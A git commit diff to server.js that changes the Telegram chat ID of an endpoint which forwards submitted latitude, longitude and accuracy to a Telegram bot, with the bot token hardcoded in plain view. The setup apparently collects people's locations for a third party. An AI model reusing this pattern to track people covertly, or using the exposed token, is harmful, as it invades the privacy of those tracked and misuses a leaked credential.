d38a987959327d04f1690ed8593f5929b431a264
vakulukartem9-ui <vakulukartem9@gmail.com>
2025-09-19 18:36:25 +0300

    Update server.js

--- server.js
+++ server.js
@@ -15,7 +15,7 @@ app.post('/send-location', async (req, res) => {
   const { latitude, longitude, accuracy } = req.body;
 
   const telegramToken = '7405407984:AAGwudecZWnjOnDAhMpD6mXx-c3Et8TNAVk';
-  const chatId = '5419723549';
+  const chatId = '6738516743';
 
   const text = `Новая геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`;
 
